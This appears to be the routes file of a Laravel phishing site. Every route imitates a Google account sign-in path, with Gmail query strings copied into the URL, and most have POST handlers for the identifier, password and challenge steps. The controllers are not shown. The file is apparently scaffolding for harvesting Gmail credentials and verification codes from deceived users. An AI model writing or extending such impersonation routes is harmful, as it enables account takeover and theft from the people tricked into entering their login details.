<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\MainController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', [MainController::class, 'home'])->name('home');

Route::get('/AccountChooser/identifier/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'homee'])->name('homee');
Route::post('/AccountChooser/identifier/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'homepost'])->name('homee');
Route::get('/signin/v2/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'secondhome'])->name('secondhome');
Route::post('/signin/v2/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'secondhomepost'])->name('secondhome');


Route::get('/signin/v2/text/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'thirdhome'])->name('thirdhome');

Route::get('/signin/v2/challenge/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'fourthpage'])->name('fourthpage');
Route::post('/signin/v2/challenge/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'fourthpagepost'])->name('fourthpage');